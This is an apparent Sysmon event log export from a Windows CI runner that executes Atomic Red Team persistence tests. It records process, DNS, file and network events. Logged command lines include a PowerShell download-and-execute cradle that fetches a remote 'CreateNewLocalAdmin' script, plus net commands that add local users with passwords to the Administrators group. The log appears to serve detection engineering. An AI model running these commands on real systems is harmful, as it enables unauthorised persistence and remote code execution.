User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:41 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:40.138
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: b.f.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:41 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:40.106
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 252.0.0.224.in-addr.arpa.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:40 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:40.059
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 6.2.e.a.c.c.4.f.0.e.e.d.0.0.f.6.0.0.0.0.0.0.0.0.0.0.0.0.0.8.e.f.ip6.arpa.
QueryStatus: 0
QueryResults: type: 12 runnervm8j6r3;
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:40 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:40.027
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 3.0.0.0.1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:39 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:38.809
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 251.0.0.224.in-addr.arpa.
QueryStatus: 0
QueryResults: type: 12 mdns.mcast.net;
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:38 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:37.262
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54744
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:38 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:37.499
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
QueryName: _ldap._tcp.dc._msdcs.WORKGROUP
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:37.317
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:38 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:37.257
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:37.477
ProcessGuid: {f995aebf-639d-6942-a005-000000000e00}
ProcessId: 1744
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:37.456
ProcessGuid: {f995aebf-639d-6942-9f05-000000000e00}
ProcessId: 10112
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" user NewLocalUser
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ParentProcessId: 7520
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:37.315
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:37.030
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kh2i1gqa.wks.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:37 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:37.008
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kh2i1gqa.wks.ps1
CreationUtcTime: 2025-12-17 08:02:37.008
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:36.924
ProcessGuid: {f995aebf-639c-6942-9d05-000000000e00}
ProcessId: 7520
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:36.689
ProcessGuid: {f995aebf-639c-6942-9c05-000000000e00}
ProcessId: 8572
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:36.671
ProcessGuid: {f995aebf-639c-6942-9b05-000000000e00}
ProcessId: 9888
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup administrators ""T1136.001_Admin"" /add
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-639c-6942-9705-000000000e00}
ParentProcessId: 7068
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /add ""T1136.001_Admin"" ""T1136_pass"" & net localgroup administrators ""T1136.001_Admin"" /add
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:36.605
ProcessGuid: {f995aebf-639c-6942-9a05-000000000e00}
ProcessId: 2112
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:36.587
ProcessGuid: {f995aebf-639c-6942-9905-000000000e00}
ProcessId: 7608
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /add ""T1136.001_Admin"" ""T1136_pass"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-639c-6942-9705-000000000e00}
ParentProcessId: 7068
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /add ""T1136.001_Admin"" ""T1136_pass"" & net localgroup administrators ""T1136.001_Admin"" /add
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:36.564
ProcessGuid: {f995aebf-639c-6942-9705-000000000e00}
ProcessId: 7068
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /add ""T1136.001_Admin"" ""T1136_pass"" & net localgroup administrators ""T1136.001_Admin"" /add
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:36.284
ProcessGuid: {f995aebf-639b-6942-9505-000000000e00}
ProcessId: 1656
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:36.082
ProcessGuid: {f995aebf-639b-6942-9505-000000000e00}
ProcessId: 1656
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dmkt4fdx.0vq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:36 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:36.061
ProcessGuid: {f995aebf-639b-6942-9505-000000000e00}
ProcessId: 1656
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dmkt4fdx.0vq.ps1
CreationUtcTime: 2025-12-17 08:02:36.061
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:35.982
ProcessGuid: {f995aebf-639b-6942-9505-000000000e00}
ProcessId: 1656
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-LocalUser -Name \""""T1136.001_PowerShell\"""" -NoPassword}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:35.731
ProcessGuid: {f995aebf-639b-6942-9405-000000000e00}
ProcessId: 2156
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:35.694
ProcessGuid: {f995aebf-639b-6942-9305-000000000e00}
ProcessId: 7196
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-639b-6942-9105-000000000e00}
ParentProcessId: 2012
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:35.672
ProcessGuid: {f995aebf-639b-6942-9105-000000000e00}
ProcessId: 2012
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:35.466
ProcessGuid: {f995aebf-639b-6942-9005-000000000e00}
ProcessId: 4496
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:35 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:33.423
ProcessGuid: {f995aebf-6399-6942-8d05-000000000e00}
ProcessId: 6288
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:34 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:32.883
ProcessGuid: {f995aebf-6398-6942-8b05-000000000e00}
ProcessId: 9984
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:34 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:32.316
ProcessGuid: {f995aebf-6398-6942-8905-000000000e00}
ProcessId: 772
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:33.219
ProcessGuid: {f995aebf-6399-6942-8d05-000000000e00}
ProcessId: 6288
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_a5dec32g.mkx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:33.199
ProcessGuid: {f995aebf-6399-6942-8d05-000000000e00}
ProcessId: 6288
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_a5dec32g.mkx.ps1
CreationUtcTime: 2025-12-17 08:02:33.199
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:33.120
ProcessGuid: {f995aebf-6399-6942-8d05-000000000e00}
ProcessId: 6288
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \""""Name = 'AtomicRedTeam_consumer'\""""
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \""""Name = 'AtomicRedTeam_filter'\""""
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \""""REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\"""" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
